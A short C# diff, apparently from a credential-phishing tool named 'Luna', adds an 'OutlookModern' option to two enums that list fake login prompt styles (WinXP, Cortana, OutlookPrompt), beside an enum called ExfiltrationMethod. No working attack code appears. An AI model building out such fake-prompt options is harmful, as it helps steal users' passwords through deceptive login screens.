@@ -39,7 +39,8 @@ namespace Luna
             GenericLogin = 3,
             WinXP = 4,
             FreezeScreen = 5,
-            Cortana = 6
+            Cortana = 6,
+            OutlookModern = 7
         }
 
         public enum ExfiltrationMethod
@@ -64,7 +65,8 @@ namespace Luna
             Win7 = 1,
             OutlookPrompt = 3,
             Generic = 4,
-            Cortana = 5
+            Cortana = 5,
+            OutlookModern = 6
         };
     }
 
